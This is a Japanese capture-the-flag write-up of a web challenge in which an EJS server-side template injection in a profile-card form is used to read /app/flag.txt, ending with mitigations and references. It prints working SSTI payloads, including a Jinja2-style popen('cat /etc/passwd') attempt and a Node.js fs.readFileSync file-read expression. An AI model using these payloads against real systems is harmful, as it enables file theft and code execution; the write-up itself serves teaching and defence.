# Smile Studio — Writeup

## 概要

- **問題名:** Smile Studio
- **カテゴリ:** Web
- **対象:** `http://10.234.128.21:22169/card`（競技環境）
- **脆弱性:** EJS Server-Side Template Injection (SSTI)
- **到達点:** `/app/flag.txt` の読み取り

プロフィール文を入力するとカードを生成するWebアプリケーションを調査した。画面には「formatting included」と記載されており、入力した文字列が単純に表示されるだけでなく、テンプレート処理される可能性を考えた。最初はXSSを検証し、次にテンプレート構文の評価を確認した。エラーからEJSを特定した後、JavaScriptの実行環境を調べてFlagを取得した。

> 以下の検証経緯は提供されたスクリーンショットから確認できる内容を整理したもの。アプリケーションのソースコードは未提供であり、内部実装の詳細は推定を含む。

## 調査の流れ

### 1. 入力欄の確認とXSSの検証

`/card` の「A few words about you」に次の文字列を入力した。

```html
<script>alert(1)</script>
```

![alt](./img/スクリーンショット%202026-10-10%200.21.18.png)
![alt](./img/スクリーンショット%202026-10-10%200.21.23.png)

XSSできる！

### 2. テンプレート式の評価を検証

EJSの出力構文を使って計算式を送った。

```ejs
<%= 7*7 %>
```
![alt](./img/スクリーンショット%202026-10-10%200.23.16.png)
生成されたカードには **`49`** が表示された。入力したテンプレート式が文字列のまま出力されず、計算されたことが分かる。これだけで実行位置を完全に断定できるわけではないが、続くEJSのサーバー側エラーと合わせてSSTIの有力な証拠となる。

### 3. テンプレートエンジンの特定

Python/Jinja2系のオブジェクト探索を想定し、次の式を試した。

```ejs
<%= self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() %>
```
![alt](./img/スクリーンショット%202026-10-10%200.26.27.png)
結果は **`self is not defined`**。エラーには `ejs:4` とテンプレート内の該当行が表示された。このため、Python/Jinja2用の式ではなく、EJS内でJavaScriptとして式が評価されていると判断した。`self` が存在しないというエラーは、この式が実行できなかった理由も説明する。

続いて、Twig向けの環境オブジェクトを利用する式も試した。

```ejs
<%=_self.env.registerUndefinedFilterCallback("file_get_contents") %>{{_self.env.getFilter("/app/flag.txt")%>
```
![alt](./img/スクリーンショット%202026-10-10%200.29.03.png)
こちらは **`missing ) after argument list while compiling ejs`** と表示された。Twig向け構文をEJSに混在させたため、EJSのJavaScriptコンパイルで構文エラーになったと考えられる。異なるテンプレートエンジンのペイロードをそのまま転用できないことを確認できた。

### 4. Node.js実行環境の調査

EJSはJavaScriptをテンプレート内で評価するため、Node.jsの `process` オブジェクトから機能にアクセスできるかを確認した。

```ejs
<%= typeof process.getBuiltinModule %>
```

生成カードに **`function`** と表示された。これにより、少なくともテンプレートの評価環境で `process.getBuiltinModule` が参照可能であると確認できた。
![alt](./img/スクリーンショット%202026-10-10%200.36.50.png)
### 5. Flagの読み取り

Node.jsの組み込み `fs` モジュールを取得し、ファイルを読み取る式を入力した。

```ejs
<%= process.getBuiltinModule('fs').readFileSync('/app/flag.txt', 'utf8') %>
```
![alt](./img/スクリーンショット%202026-10-10%200.38.22.png)
カード上に次のFlagが表示された。

```text
flag{smile_r48ujgl39298uf3r42342r40e20-uf08!h}
```


## なぜ成立したか

EJSでは `<%= ... %>` はJavaScript式の結果をHTMLエスケープして出力するタグである。HTMLエスケープは出力された文字列のHTML解釈を抑えるもので、**式自体の実行を禁止する機能ではない**。したがって、ユーザー入力をテンプレート本文としてコンパイルする実装であれば、式から利用可能なNode.js APIに到達できる。

今回の結果は、ユーザー入力が単なるデータではなく、EJSテンプレートの一部として評価されたことを示している。`process.getBuiltinModule('fs')` が利用でき、実行プロセスから読める `/app/flag.txt` を取得できた。実際のソースコードは未確認なので、入力文字列をどの関数でテンプレートに組み込んだかまでは断定しない。

## 試行結果一覧

| 入力・試行 | 観測結果 | 判断 |
|---|---|---|
| `<script>alert(1)</script>` | 入力画面を確認 | XSSの成否は未確認 |
| `<%= 7*7 %>` | `49` | テンプレート式が評価された |
| Python/Jinja2風の `self.__init__...` | `self is not defined`、`ejs:4` | EJS環境でPython式は使用できない |
| Twig風の `_self.env...` | EJSコンパイルエラー | エンジン不一致 |
| `typeof process.getBuiltinModule` | `function` | Node.js APIへの参照を確認 |
| `fs.readFileSync('/app/flag.txt','utf8')` | Flag表示 | 任意ファイル読み取りの実証 |

## 工夫した点

1. **XSSだけに絞らなかった:** 「formatting included」というUIの説明からテンプレート処理の可能性を考え、計算式を試した。
2. **簡単な計算式から始めた:** いきなりファイルを読むのではなく、`7*7` の評価で実行の有無を切り分けた。
3. **エラーを識別情報として使った:** `ejs:4` と `self is not defined` からテンプレートエンジンと実行言語を特定した。
4. **他エンジンの手法を比較した:** Jinja2やTwig向けの探索が失敗した理由を整理し、EJS/Node.js向けに切り替えた。
5. **段階的にNode.js APIを確認した:** `typeof` で機能の存在を調べてから、`fs.readFileSync` によるファイル読み取りを行った。

## 対策

ユーザー入力をEJSテンプレートの**ソースコード**として組み立てない。固定のテンプレートを用意し、入力は変数として渡す。

```js
// 避けるべき例（概念図）
const result = ejs.render(`<p>${userBio}</p>`);

// 推奨される例（固定テンプレートを使用）
const result = ejs.render('<p><%= bio %></p>', { bio: userBio });
```

また、アプリケーションを最小権限で実行し、機密ファイルをアプリケーションから読み取れないようにする。テンプレートのコンパイルエラーを利用者に詳細表示しないことも、内部情報の露出を抑えるために重要である。ただし、エラー非表示だけではSSTIは修正されない。

## 参考資料

- [PortSwigger Web Security Academy — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) — 計算式による検出、エンジン特定、調査手順。
- [PortSwigger Research — Server-Side Template Injection (James Kettle)](https://portswigger.net/research/server-side-template-injection) — XSSとSSTIの違い、調査方法の背景。
- [EJS公式ドキュメント](https://ejs.co/docs/) — `<%=` と `<%-` の違い、EJSタグの動作。
- [Node.js — Process API](https://nodejs.org/api/process.html) — `process.getBuiltinModule` の仕様。
- [Node.js — File system API](https://nodejs.org/api/fs.html) — `readFileSync` の仕様。

## まとめ

本問は、プロフィールカードの自由入力欄からEJSテンプレート式を評価させられるSSTI問題だった。最初にXSSを試し、算術式でテンプレート評価を確認し、エラーメッセージからEJSを特定した。Python/Jinja2・Twig向けの手法が通用しないことを確認した後、Node.jsの `process.getBuiltinModule` から `fs` を利用してFlagファイルの読み取りに成功した。
